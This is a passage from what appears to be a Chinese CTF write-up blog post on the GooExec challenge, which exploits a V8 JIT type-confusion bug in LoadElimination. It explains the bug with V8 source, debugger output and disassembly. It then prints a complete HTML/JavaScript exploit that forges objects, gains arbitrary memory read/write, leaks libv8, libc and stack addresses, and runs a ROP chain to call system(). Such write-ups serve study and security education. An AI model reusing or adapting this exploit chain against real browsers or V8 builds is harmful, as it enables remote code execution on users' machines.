&#125;</span><br><span class="line">  return this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>继续看<code>Kill</code>的源码,如果有两个node指向同一个对象，则创建了新map。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">LoadElimination::AbstractElements const*</span><br><span class="line">LoadElimination::AbstractElements::Kill(Node* object, Node* index,</span><br><span class="line">                                        Zone* zone) const &#123;</span><br><span class="line">  for (Element const element : this-&gt;elements_) &#123;</span><br><span class="line">    if (element.object == nullptr) continue;</span><br><span class="line">    if (MayAlias(object, element.object)) &#123; //如果有两个node指向同一个对象</span><br><span class="line">      AbstractElements* that = new (zone) AbstractElements(zone);</span><br><span class="line">      for (Element const element : this-&gt;elements_) &#123;</span><br><span class="line">        if (element.object == nullptr) continue;</span><br><span class="line">        DCHECK_NOT_NULL(element.index);</span><br><span class="line">        DCHECK_NOT_NULL(element.value);</span><br><span class="line">        if (!MayAlias(object, element.object) ||</span><br><span class="line">            !NodeProperties::GetType(index).Maybe(</span><br><span class="line">                NodeProperties::GetType(element.index))) &#123;</span><br><span class="line">          that-&gt;elements_[that-&gt;next_index_++] = element;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      that-&gt;next_index_ %= arraysize(elements_);</span><br><span class="line">      return that;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从上面的源码来看，如果有<code>两个node指向的是同一个对象</code>，那么<code>state = state-&gt;KillMaps(object, zone());</code>就会更新两个node的checkmap，这样后续生成JIT代码时，用不同的node去操作源对象也不会发生问题。为了进一步验证猜想，我们用gdb调试一下。<br>gdb设置参数，其中–no-enable-slow-asserts是为了能够使用<code>p state-&gt;Print()</code>来查看checkmaps的信息，否则会报错。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set args --allow-natives-syntax ./3.js --no-enable-slow-asserts</span><br></pre></td></tr></table></figure>
+<p>测试代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function opt(a,b) &#123; </span><br><span class="line">   a[0] = 1.1;</span><br><span class="line">   b[0] = 1.1;</span><br><span class="line">   a[0] = &#123;&#125;;</span><br><span class="line">   b[0] = 1.1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x2000;i++) &#123; </span><br><span class="line">   a = Array(0);</span><br><span class="line">   opt(a,a);</span><br><span class="line">&#125;</span><br><span class="line">a = Array(0);</span><br><span class="line">opt(a,a);</span><br><span class="line">print(a[0]);</span><br></pre></td></tr></table></figure>
+<p>执行SetMaps之前，因为有<code>a[0] = 1.1;b[0] = 1.1;</code>，所以它们之前已经是<code>HOLEY_DOUBLE_ELEMENTS</code>类型<br><img src="https://p3.ssl.qhimg.com/t0153ed9e03c4e29128.png"><br>执行之后，由于没有KillMaps，因此b仍然保留为<code>HOLEY_DOUBLE_ELEMENTS</code>类型<br><img src="https://p3.ssl.qhimg.com/t01cb967de84df402c6.png"><br>如果接下来执行<code>   b[0] = 1.1;</code>，按理来说是以<code>HOLEY_DOUBLE_ELEMENTS</code>的方式向elements里写了一个double值，由于它指向的对象已经变成了<code>HOLEY_ELEMENTS</code>类型，那么再次从中取元素时，double值被当成对象指针对待，因此通过控制double值，能够使得取出的值作为指针能正好指向我们可控的内存区，那么我们就可以伪造对象了。<br>然而实际情况是，执行<code> b[0] = 1.1;</code>时，仍然是以<code>HOLEY_ELEMENTS</code>的方式写入，即将1.1包装为一个HeapNumber，然后保存指针到elements。在JIT编译的时候,末尾的两句<code>a[0] = &#123;&#125;;</code>和<code>b[0] = 1.1;</code>不能同时出现，否则JIT编译器收集到的信息比较充分会使得漏洞利用失败，因此应该想办法让这两句的编译时期分开，由此可以加一个条件判断，这样，两句在编译时期不会同时出现。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function opt(a,b,f1,f2) &#123;</span><br><span class="line">   a[0] = 1.1;</span><br><span class="line">   b[0] = 1.1;</span><br><span class="line">   if (f1)</span><br><span class="line">      a[0] = &#123;&#125;;</span><br><span class="line">   if (f2)</span><br><span class="line">      b[0] = 1.1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x2000;i++) &#123;</span><br><span class="line">   a = Array(0);</span><br><span class="line">   opt(a,a,true,false);</span><br><span class="line">   a = Array(0);</span><br><span class="line">   opt(a,a,false,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a = Array(0);</span><br><span class="line">opt(a,a,true,true);</span><br><span class="line">print(a[0]);</span><br></pre></td></tr></table></figure>
+<p>通过<code>%DebugPrint(a)</code>查看对象a</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x2aa8083dc8e1: [JSArray]</span><br><span class="line"> - map: 0x2aa808303975 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x2aa8082cb529 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x2aa8083dc99d &lt;FixedArray[17]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x2aa8080426dd &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    0x2aa808044649: [String] in ReadOnlySpace: #length: 0x2aa808242159 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x2aa8083dc99d &lt;FixedArray[17]&gt; &#123;</span><br><span class="line">           0: -858993459</span><br><span class="line">pwndbg&gt; dd 0x2aa8083dc99c</span><br><span class="line">00002aa8083dc99c     080424a5 00000022 9999999a 3ff19999</span><br><span class="line">00002aa8083dc9ac     080423a1 080423a1 080423a1 080423a1</span><br><span class="line">00002aa8083dc9bc     080423a1 080423a1 080423a1 080423a1</span><br><span class="line">00002aa8083dc9cc     080423a1 080423a1 080423a1 080423a1</span><br></pre></td></tr></table></figure>
+<p>可以看到，1.1这个double值被误认为是对象指针，由此可以伪造对象。</p>
+<h3 id="JIT代码分析"><a href="#JIT代码分析" class="headerlink" title="JIT代码分析"></a>JIT代码分析</h3><p>首先poc的前面一大部分操作都是为了生成有问题的JIT代码，<code>LoadElimination::ReduceTransitionElementsKind</code>是在编译器编译时调用的，而不是JIT代码运行时调用的。JIT编译完成后就不需要再调用这个进行转换了，因为转换的操作已经固化成汇编的形式了。如下是截取的有问题的JIT代码（关键部分）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x353900085199   2d9  45398528010000 cmpl [r13+0x128] (root (heap_number_map)),r8</span><br><span class="line">0x3539000851a0   2e0  0f84b1010000   jz 0x353900085357  &lt;+0x497&gt;</span><br><span class="line">0x3539000851a6   2e6  453985a8010000 cmpl [r13+0x1a8] (root (bigint_map)),r8</span><br><span class="line">0x3539000851ad   2ed  0f8492010000   jz 0x353900085345  &lt;+0x485&gt;</span><br><span class="line">0x3539000851b3   2f3  8b4f07         movl rcx,[rdi+0x7]</span><br><span class="line">0x3539000851b6   2f6  4903cd         REX.W addq rcx,r13</span><br><span class="line">0x3539000851b9   2f9  c5fb114107     vmovsd [rcx+0x7],xmm0</span><br><span class="line">0x3539000851be   2fe  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x3539000851c1   301  5d             pop rbp</span><br><span class="line">0x3539000851c2   302  c22800         ret 0x28</span><br></pre></td></tr></table></figure>
+<p>我们再看一下在正常的v8引擎中相同部分编译的JIT代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0x320a00084f30    70  48b9253930080a320000 REX.W movq rcx,0x320a08303925    ;; object: 0x320a08303925 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line">................................................................</span><br><span class="line">0x320a0008519d   2dd  4539a528010000 cmpl [r13+0x128] (root (heap_number_map)),r12</span><br><span class="line">0x320a000851a4   2e4  0f84da010000   jz 0x320a00085384  &lt;+0x4c4&gt;</span><br><span class="line">0x320a000851aa   2ea  4539a5a8010000 cmpl [r13+0x1a8] (root (bigint_map)),r12</span><br><span class="line">0x320a000851b1   2f1  0f84ba010000   jz 0x320a00085371  &lt;+0x4b1&gt;</span><br><span class="line">0x320a000851b7   2f7  394fff         cmpl [rdi-0x1],rcx</span><br><span class="line">0x320a000851ba   2fa  0f858c020000   jnz 0x320a0008544c  &lt;+0x58c&gt;</span><br><span class="line">0x320a000851c0   300  8b4f07         movl rcx,[rdi+0x7]</span><br><span class="line">0x320a000851c3   303  4903cd         REX.W addq rcx,r13</span><br><span class="line">0x320a000851c6   306  c5fb114107     vmovsd [rcx+0x7],xmm0</span><br><span class="line">0x320a000851cb   30b  488b4de8       REX.W movq rcx,[rbp-0x18]</span><br><span class="line">0x320a000851cf   30f  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x320a000851d2   312  5d             pop rbp</span><br><span class="line">0x320a000851d3   313  4883f904       REX.W cmpq rcx,0x4</span><br><span class="line">0x320a000851d7   317  7f03           jg 0x320a000851dc  &lt;+0x31c&gt;</span><br><span class="line">0x320a000851d9   319  c22800         ret 0x28</span><br></pre></td></tr></table></figure>
+<p>可以知道，漏洞的v8的JIT编译的代码正是因为少了这一句map类型的比较，从而导致了类型混淆。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x320a000851b7   2f7  394fff         cmpl [rdi-0x1],rcx</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>现在的v8存在指针压缩机制(pointer compression)，在这种机制下，指针都用4字节来表示，即将指针的基址单独仅存储一次，然后每个指针只需存后4字节即可，因为前2字节一样，这样可以节省空间。这种机制下，堆地址是可以预测的，我们可以申请一个较大的堆空间，这样它的地址在同一台机子上就很稳定基本不变（会随系统的内存以及其他一些配置变化），在不同机子上有微小变化，可以枚举爆破。<br>只需要伪造一个ArrayBuffer，即可实现任意地址读写，由于本题的v8是linux下的，因此比较好利用，直接泄露栈地址然后劫持栈做ROP即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">function opt(a,b,f1,f2)</span><br><span class="line">&#123;</span><br><span class="line">    a[0] = 1.1;</span><br><span class="line">    b[0] = 1.1;</span><br><span class="line">    if (f1)</span><br><span class="line">        a[0] = &#123;&#125;;</span><br><span class="line">    if (f2)</span><br><span class="line">        b[0] = 1.9035980891199164e+185; //这个浮点数在内存里的表示指向了faker[1]，因此，我们可以在faker[1]处开始伪造对象</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//申请一个大的Array，由于V8的compression ptr，其地址低四字节稳定</span><br><span class="line">const faker = new Array(0x10000);</span><br><span class="line">faker.fill(4.765139213524301e-270);</span><br><span class="line"></span><br><span class="line">var buf = new ArrayBuffer(0x10000);</span><br><span class="line">var dv = new DataView(buf);</span><br><span class="line">dv.setUint32(0,0xABCDEF78,true);</span><br><span class="line"></span><br><span class="line">//将一个32位整数打包位64位浮点数</span><br><span class="line">function p64(val) &#123;</span><br><span class="line">   dv.setUint32(0x8,val &amp; 0xFFFFFFFF,true);</span><br><span class="line">   dv.setUint32(0xC,val &gt;&gt; 32,true);</span><br><span class="line">   var float_val = dv.getFloat64(0x8,true);</span><br><span class="line">   return float_val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//将两个32位整数打包为一个64位浮点数</span><br><span class="line">function p64(low4,high4) &#123;</span><br><span class="line">   dv.setUint32(0x8,low4,true);</span><br><span class="line">   dv.setUint32(0xC,high4,true);</span><br><span class="line">   var float_val = dv.getFloat64(0x8,true);</span><br><span class="line">   return float_val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//解包64位浮点数的低四字节</span><br><span class="line">function u64_l(val) &#123;</span><br><span class="line">   dv.setFloat64(0x8,val,true);</span><br><span class="line">   return dv.getUint32(0x8,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//解包64位浮点数的高四字节</span><br><span class="line">function u64_h(val) &#123;</span><br><span class="line">   dv.setFloat64(0x8,val,true);</span><br><span class="line">   return dv.getUint32(0xC,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//伪造一个FixedJSArray对象用于构造addressOf和fakeObject原语</span><br><span class="line">faker[1] = p64(0x082031cd,0x080426dd);</span><br><span class="line">faker[2] = p64(0x08342135,0x2);</span><br><span class="line">//伪造FixedJSArray的element</span><br><span class="line">faker[3] = p64(0x080424a5,0x2);</span><br><span class="line"></span><br><span class="line">//强制触发JIT编译，生成有漏洞的代码</span><br><span class="line">let a;</span><br><span class="line">for (let i = 0; i &lt; 0x200000; i++)</span><br><span class="line">&#123;</span><br><span class="line">    a = Array(0);</span><br><span class="line">    opt(a,a,true,false);</span><br><span class="line">    a = Array(0);</span><br><span class="line">    opt(a,a,false,true);</span><br><span class="line">&#125;</span><br><span class="line">//调用有漏洞的JIT代码，使得对象a发生类型混淆</span><br><span class="line">a = Array(0);</span><br><span class="line">opt(a,a,true,true);</span><br><span class="line"></span><br><span class="line">function addressOf(obj) &#123;</span><br><span class="line">   var o = a[0];</span><br><span class="line">   o[0] = obj;</span><br><span class="line">   return u64_l(faker[4]) - 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeObject(addr_to_fake) &#123;</span><br><span class="line">   var o = a[0];</span><br><span class="line">   faker[4] = p64(addr_to_fake + 1);</span><br><span class="line">   return o[0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function isInt(obj) &#123;</span><br><span class="line">   return obj % 1 === 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var buf_addr = addressOf(buf);</span><br><span class="line">//alert(&quot;buf_addr=&quot;+buf_addr.toString(16));</span><br><span class="line">var backing_store_ptr = buf_addr + 0x14 + 0x8;</span><br><span class="line">//伪造一个ArrayBuffer用于任意地址读写</span><br><span class="line">faker[5] = p64(0,0x08202dbd);</span><br><span class="line">faker[6] = p64(0x080426dd,0x080426dd);</span><br><span class="line">faker[7] = p64(0xffffffff,0);</span><br><span class="line">faker[8] = p64(0,0);</span><br><span class="line">faker[9] = p64(0,2);</span><br><span class="line"></span><br><span class="line">//伪造一个FixedDoubleArray用于泄露地址，因为最开始，我们不知道compression ptr的高4字节是什么，因此用FixedDoubleArray可以进行相对寻址，从而泄露数据</span><br><span class="line">faker[10] = p64(0,0x0820317d);</span><br><span class="line">faker[11] = p64(0x080426dd,0x08342181)</span><br><span class="line">faker[12] = p64(0x7ffffffe,0x08042a31);</span><br><span class="line">faker[13] = p64(0x7ffffffe,0)</span><br><span class="line"></span><br><span class="line">//注意内存对齐</span><br><span class="line">if (parseInt(backing_store_ptr &amp; 0xf) == 0x4 || parseInt(backing_store_ptr &amp; 0xf) == 0xc) &#123;</span><br><span class="line">   faker[15] = p64(0x08042a31,0x7ffffffe);</span><br><span class="line">   faker[11] = p64(0x080426dd,0x08342195)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//获得伪造的对象</span><br><span class="line">var arb_bufferArray = fakeObject(0x08342148);</span><br><span class="line">var fake_doubleArr = fakeObject(0x08342170);</span><br><span class="line"></span><br><span class="line">var offset;</span><br><span class="line">if (parseInt(backing_store_ptr &amp; 0xf) == 0x4 || parseInt(backing_store_ptr &amp; 0xf) == 0xc) &#123;</span><br><span class="line">   offset = (0xFFFFFFFF - 0x0834219b + backing_store_ptr) / 8;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">   offset = (0xFFFFFFFF - 0x08342187 + backing_store_ptr) / 8;</span><br><span class="line">&#125;</span><br><span class="line">//泄露buf对象里的数据</span><br><span class="line">var v = fake_doubleArr[offset];</span><br><span class="line">//alert(&quot;offset=&quot;+offset.toString(16));</span><br><span class="line">//alert(&quot;heap_addr=&quot; + u64_h(v).toString(16) + u64_l(v).toString(16));</span><br><span class="line"></span><br><span class="line">//伪造ArrayBuffer的backing_store，从而实现任意地址读写</span><br><span class="line">faker[8] = p64(u64_l(v) + 0x10,u64_h(v));</span><br><span class="line">var fdv = new DataView(arb_bufferArray);</span><br><span class="line">var heap_t_l = fdv.getUint32(0,true);</span><br><span class="line">var heap_t_h =fdv.getUint32(4,true);</span><br><span class="line"></span><br><span class="line">//泄露libv8.so的地址</span><br><span class="line">faker[8] = p64(heap_t_l,heap_t_h);</span><br><span class="line">var elf_addr_l = fdv.getUint32(0,true);</span><br><span class="line">var elf_addr_h = fdv.getUint32(4,true);</span><br><span class="line">var elf_base_l = elf_addr_l - 0xeb4028;</span><br><span class="line">var elf_base_h = elf_addr_h;</span><br><span class="line"></span><br><span class="line">//alert(&quot;elf_base=&quot; + elf_base_h.toString(16) + elf_base_l.toString(16));</span><br><span class="line">var strlen_got_l = elf_base_l + 0xEF4DB8;</span><br><span class="line">var free_got_l = elf_base_l + 0xEF7A18;</span><br><span class="line">//0x0000000000b9ac48 : mov rdi, qword ptr [r13 + 0x20] ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x30]</span><br><span class="line">var mov_rdi = elf_base_l + 0xb9ac48;</span><br><span class="line">//0x000000000076039f : mov rdx, qword ptr [rax] ; mov rax, qword ptr [rdi] ; mov rsi, r13 ; call qword ptr [rax + 0x10]</span><br><span class="line">var mov_rdx = elf_base_l + 0x76039f;</span><br><span class="line">var pop_rdi = elf_base_l + 0x6010bb;</span><br><span class="line">//泄露libc地址</span><br><span class="line">faker[8] = p64(strlen_got_l,elf_base_h);</span><br><span class="line">var strlen_addr_l = fdv.getUint32(0,true);</span><br><span class="line">var strlen_addr_h = fdv.getUint32(4,true);</span><br><span class="line"></span><br><span class="line">var libc_base_l = strlen_addr_l - 0x18b660;</span><br><span class="line">var libc_base_h = strlen_addr_h;</span><br><span class="line">var mov_rsp_rdx_l = libc_base_l + 0x5e650;</span><br><span class="line">var environ_ptr_addr_l = libc_base_l + 0x1EF2E0;</span><br><span class="line">var system_l = libc_base_l + 0x55410;</span><br><span class="line">//alert(&quot;libc_base=&quot; + libc_base_h.toString(16) + libc_base_l.toString(16));</span><br><span class="line">//alert(&quot;system_l=&quot; + libc_base_h.toString(16) + system_l.toString(16));</span><br><span class="line">//泄露栈地址</span><br><span class="line">faker[8] = p64(environ_ptr_addr_l,libc_base_h);</span><br><span class="line">var stack_addr_l = fdv.getUint32(0,true);</span><br><span class="line">var stack_addr_h = fdv.getUint32(4,true);</span><br><span class="line">//alert(&quot;stack_addr=&quot;+stack_addr_h.toString(16) + stack_addr_l.toString(16));</span><br><span class="line"></span><br><span class="line">faker[8] = p64(u64_l(v) + 0x80,u64_h(v));</span><br><span class="line">heap_t_l = fdv.getUint32(0,true);</span><br><span class="line">heap_t_h =fdv.getUint32(4,true);</span><br><span class="line"></span><br><span class="line">if (parseInt(heap_t_h) == 0) &#123;</span><br><span class="line">   location.reload();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">   //泄露compression ptr的高4字节数据</span><br><span class="line">   faker[8] = p64(heap_t_l,heap_t_h);</span><br><span class="line">   var compression_ptr_high = fdv.getUint32(4,true);</span><br><span class="line">   //alert(&quot;compression_ptr_high=&quot;+compression_ptr_high.toString(16));</span><br><span class="line">   //泄露buf的数据区地址</span><br><span class="line">   v = fake_doubleArr[offset - 1];</span><br><span class="line">   var buf_data_addr_l = u64_l(v);</span><br><span class="line">   var buf_data_addr_h = u64_h(v);</span><br><span class="line">   //在数据区布下ROP等</span><br><span class="line">   dv.setFloat64(0,p64(buf_data_addr_l+0x10,buf_data_addr_h),true);</span><br><span class="line">   dv.setFloat64(0x40,p64(mov_rdx,elf_base_h),true);</span><br><span class="line">   dv.setFloat64(0x20,p64(mov_rsp_rdx_l,libc_base_h),true);</span><br><span class="line">   //rsp</span><br><span class="line">   dv.setFloat64(0x10,p64(buf_data_addr_l+0x2000,buf_data_addr_h),true);</span><br><span class="line"></span><br><span class="line">   //rop</span><br><span class="line">   dv.setFloat64(0x2000,p64(pop_rdi,elf_base_h),true);</span><br><span class="line">   dv.setFloat64(0x2008,p64(buf_data_addr_l+0x2018,buf_data_addr_h),true);</span><br><span class="line">   dv.setFloat64(0x2010,p64(system_l,libc_base_h),true)</span><br><span class="line">   var cmd = &quot;gnome-calculator\x00&quot;;</span><br><span class="line">   var bufView = new Uint8Array(buf);</span><br><span class="line">   for (var i = 0, strlen = cmd.length; i &lt; strlen; i++) &#123;</span><br><span class="line">      bufView[0x2018+i] = cmd.charCodeAt(i);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   //修改0x20处为buf_data_addr</span><br><span class="line">   faker[8] = p64(0x20,compression_ptr_high);</span><br><span class="line">   fdv.setFloat64(0,p64(buf_data_addr_l,buf_data_addr_h),true);</span><br><span class="line"></span><br><span class="line">   //劫持栈返回地址为mov_rdi，将栈最终迁移到buf_data_addr里做ROP</span><br><span class="line">   var rop_addr_l = stack_addr_l - 0x1b18;</span><br><span class="line">   faker[8] = p64(rop_addr_l,stack_addr_h);</span><br><span class="line">   fdv.setFloat64(0,p64(mov_rdi,elf_base_h),true);</span><br><span class="line">&#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-感想"><a href="#0x03-感想" class="headerlink" title="0x03 感想"></a>0x03 感想</h2><p>通过这一题，学习了v8方面的很多知识，对JIT也有了一定的了解</p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-262205.htm">强网杯2020线下GooExec</a><br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000023193375">你可能不知道的v8数组优化</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40413670/article/details/106738425">深入理解Js数组</a><br><a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/v8/v8.git/+/ec37390b2ba2b4051f46f153a8cc179ed4656f5d:src/elements-kind.h;l=14">(v8 source)elements-kind.h</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/vul/id/1069139">Google Chrome V8 JIT - ‘LoadElimination::ReduceTransitionElementsKind’ Type Confusion</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
